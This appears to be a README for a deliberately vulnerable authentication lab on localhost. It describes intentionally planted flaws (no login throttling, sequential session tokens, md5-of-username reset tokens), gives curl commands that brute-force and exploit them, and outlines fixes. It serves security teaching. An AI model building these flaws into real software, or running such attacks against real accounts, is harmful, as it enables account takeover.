# 04 — Broken Authentication

Port: `3004`

## Vulnerable behavior

- `POST /login` — no rate limiting/lockout, so it's brute-forceable.
- Session tokens (`GET /whoami`) are sequential integers, not random — trivially guessable/predictable.
- `GET /reset-token?username=` returns `md5(username)`, a deterministic value anyone can compute without owning the account.

## Example

```bash
# Brute force (toy wordlist)
for pw in 123456 password sunshine1 letmein; do
  curl -s -X POST http://localhost:3004/login -d "username=alice&password=$pw"
  echo
done

# Predictable session token
curl -s -X POST http://localhost:3004/login -d "username=alice&password=sunshine1"
curl -s -X POST http://localhost:3004/login -d "username=bob&password=football"
# compare the two returned tokens — they're sequential

# Guessable reset token
curl "http://localhost:3004/reset-token?username=admin"
```

## What the fix would look like

Random, high-entropy session tokens; hashed+salted passwords with a slow
hash (bcrypt/argon2); login attempt throttling/lockout; single-use,
cryptographically random, time-limited password-reset tokens sent only to
the verified account owner.